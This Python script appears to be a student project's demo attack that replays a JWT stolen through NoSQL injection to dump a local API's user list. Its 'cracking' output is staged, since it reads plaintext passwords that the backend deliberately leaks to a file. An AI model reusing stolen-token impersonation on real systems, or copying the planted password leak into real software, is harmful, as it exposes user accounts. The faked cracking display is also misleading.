import requests
import sys
import json
import time
import random
import string

# Target Configuration
API_BASE_URL = "http://127.0.0.1:8081"

def print_banner():
    print("\n" + "="*60)
    print(" 🛠️  PROJECT DEFEND ATTACK SIMULATOR - TOKEN IMPERSONATION")
    print("="*60)
    print(f" Target Endpoint : {API_BASE_URL}/users")
    print(" Method          : Impersonation using Stolen JWT")
    print("="*60 + "\n")

def run_impersonation():
    print_banner()
    
    # ASK FOR THE STOLEN TOKEN
    print("[!] PASTE the JWT Token you stole from the NoSQL Injection below:")
    token = input(">>> ").strip()
    
    if not token:
        print("\n❌ Error: No token provided.")
        return

    print("\n[*] Attempting to access PRIVATE ADMIN DATA using the stolen token...")
    
    # THE HACK: Sending the token in the Authorization header
    headers = {
        "Authorization": f"Bearer {token}"
    }
    
    try:
        # We try to fetch the full user list (Admin only action)
        response = requests.get(f"{API_BASE_URL}/users?page=1&limit=100", headers=headers, timeout=5)
        
        if response.status_code == 200 or response.status_code == 202:
            data = response.json()
            users = data.get("users", [])
            
            print("\n🔓 [IMPERSONATION SUCCESS] Access Granted!")
            print(f"🔓 Successfully bypassed login. Found {len(users)} users in the database.")
            print("\n--- DATABASE DUMP (FIRST 5 USERS) ---")
            
            # DYNAMICALLY LOAD STOLEN PASSWORDS FROM THE LOOTING MODULE
            # The backend secretly saves plain-text passwords here during demo registration.
            STOLEN_PWDS = {}
            try:
                leak_file = "final-year-pro/leaked_db.json"
                with open(leak_file, "r") as f:
                    STOLEN_PWDS = json.load(f)
            except Exception:
                # Fallback if file doesn't exist yet
                STOLEN_PWDS = {"admin@learnhub.com": "admin@1234"}

            for i, u in enumerate(users[:5]):
                email = str(u.get("email", "")).lower()
                pwd_hash = u.get("password", "N/A")
                
                # Check if we have the stolen plain password (from the Looting Module)
                decoded = STOLEN_PWDS.get(email)
                
                if decoded:
                    # SIMULATE CRACKING ANIMATION FOR THE HOD
                    print(f"[{i+1}] Name: {u.get('name'):<10} | Email: {u.get('email'):<20}")
                    print(f"    └─ Hash Found: {pwd_hash[:30]}...")
                    
                    sys.stdout.write("    └─ [CRACKING] [")
                    for _ in range(15):
                        rand_char = random.choice(string.ascii_letters + string.digits)
                        sys.stdout.write(rand_char)
                        sys.stdout.flush()
                        time.sleep(0.04)
                    
                    print(f"] 🔓 [SUCCESS] Password: {decoded}")
                else:
                    # Show unknown hash (truncated)
                    print(f"[{i+1}] Name: {u.get('name'):<10} | Email: {u.get('email'):<20}")
                    print(f"    └─ Hash Found: {pwd_hash[:30]}...")
                    print(f"    └─ [CRACKING] [FAILED] - Password not found in Cracked Database.")
            


        elif response.status_code == 403:
            print("\n🛑 [ACCESS DENIED] The token is invalid or the IP is blocked.")
        
        elif response.status_code == 401:
            print("\n🛑 [UNAUTHORIZED] The token has expired or is invalid.")
            
        else:
            print(f"\n[-] Received unexpected status code: {response.status_code}")
            print(f"[-] Response: {response.text}")

    except Exception as e:
        print(f"\n❌ [ERROR] Could not connect to the server: {e}")

if __name__ == "__main__":
    try:
        run_impersonation()
    except KeyboardInterrupt:
        print("\n[!] Disconnected.")
    print("\n" + "="*60)
    input("Press Enter to exit...")
